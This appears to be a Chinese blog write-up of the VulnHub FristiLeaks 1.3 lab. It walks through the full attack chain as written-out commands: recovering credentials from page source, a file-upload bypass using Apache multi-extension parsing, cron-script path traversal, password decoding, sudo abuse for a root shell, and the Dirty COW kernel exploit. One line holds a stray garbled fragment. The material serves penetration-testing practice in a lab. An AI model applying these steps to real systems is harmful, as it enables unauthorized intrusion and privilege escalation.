---
title: FristiLeaks-1.3
author: Creexile
date: 2024-10-01 16:59:50
lastMod: 2025-04-10
summary: 'No.9'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [文件上传, 提权, 漏洞利用, 渗透]
---

# FristiLeaks: 1.3

---

No.9

> 来源: [vulnhub靶场-FristiLeaks:1.3](https://www.vulnhub.com/entry/fristileaks-13,133/)
>
> 目标: get UID 0 (root) and read the special flag file. Timeframe: should be doable in 4 hours. (该描述在首页源码中)
>
> 妙妙工具: python -c 'import pty; pty.spawn("/bin/bash")'

## 环境配置

kali: 192.168.56.5

target: 192.168.56.14

注意需要配置MAC地址, 否则会出现靶机启动后不会显示ip地址, 应该会显现"你的网络配置有点问题"之类的; 下图是正确配置之后的截图:

![image-20241001145155923](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241001145155923.png)

## 信息收集

- 端口: 80
- 中间件: Apache httpd 2.2.15
- 目录: /robots.txt->/cola /sisi /beer, /cgi-bin, /images
- 系统: CentOS

什么也没有, 要么forbidden要么被告知错误

扒拉网站的字符串试试, 也没有

```
cewl http://192.168.56.14 -w pc.txt
```

那就扒拉图片的字符, 试出来有一个`/fristi/`, 是登录界面

源码中有一大串base64, 甚至还有注释:

![image-20241001151845989](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241001151845989.png)

这个base64解码后有png头, 试试base64在线转图片, 可以得到一大串字符: `keKkeKKeKKeKkEkkEk`

结合这是eezeepz留下来的, 账密即为`eezeepz : keKkeKKeKKeKkEkkEk`

## getshell

登录看到一个文件上传, 上传目录为`/uploads`, 而且是白名单, 仅能通过png, jpg, gif

但是Apache HTTPD有一个多后缀解析漏洞: 只要一个文件含有.php后缀的文件即将被识别成PHP文件, 没必要是最后一个后缀, 我们就赌管理员设置出现问题有这个漏洞

![image-20241001153759922](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241001153759922.png)

好, 连上了就继续吧

## 信息收集

- 权限: apache
- 内核: Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
- 环境: gcc, cc, python
- 用户: admin, eezeepz, fristigod, 没有打开22端口
- 服务: MySQL, 没找到密码

在`/var/www`下有一个notes.txt, 提示我们eezeepz的`/home`可能有东西, 来自jerry

然后`/home/eezeepz`下找到另一个notes.txt, 翻译一下:

1. 我们只能访问`/usr/bin/*`
2. 在`/tmp/runthis`中, 该脚本以admin身份定时执行任何命令

但是可以利用目录穿越, 将这个文件将admin不可访问的变为可以任意访问的

```bash
echo '/usr/bin/../../bin/chmod -R 777 /home/admin' > /tmp/runthis
```

稍等便可以进入`/home/admin`, 该目录下`whoisyourgodnow.txt`和`cryptedpass.txt`各有一段加密的字符串:

```
=RFn0AKnlMHMPIzpyuTI0ITG
mVGZ3O3omkJLmy2pcuTq
```

还找到一个加密脚本`cryptpass.py`

```python
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

编写解密脚本即可

```python
import base64,codecs,sys

def decryptString(str):
    rot13str = codecs.decode(str[::-1], 'rot13')
    return base64.b64decode(rot13str)

print decryptString(sys.argv[1])
```

解密如下:

```bash
python decrypt.py =RFn0AKnlMHMPIzpyuTI0ITG
# LetThereBeFristi!
python decrypt.py mVGZ3O3omkJLmy2pcuTq
# thisisalsopw123
```

## 提权

尝试su切换用户, 得到`fristigod : LetThereBeFristi!`

利用`sudo -l`, 发现该用户可以通过sudo控制`/var/fristigod/.secret_admin_stuff/doCom`, 在历史命令(`history`)中也是多次利用这个文件查看根目录下文件 XC899`459尘白89 , 可以利用该文件提权

```bash
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
```

![image-20241001164141279](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241001164141279.png)

## 附录

低版本linux内核可以直接用脏牛漏洞:

```bash
searchsploit 40839
gcc -pthread 40839.c -o dcow -lcrypt
./dcow admin
# 提示将firefart密码修改为rong为root权限
su firefart
# 输入admin即可
```
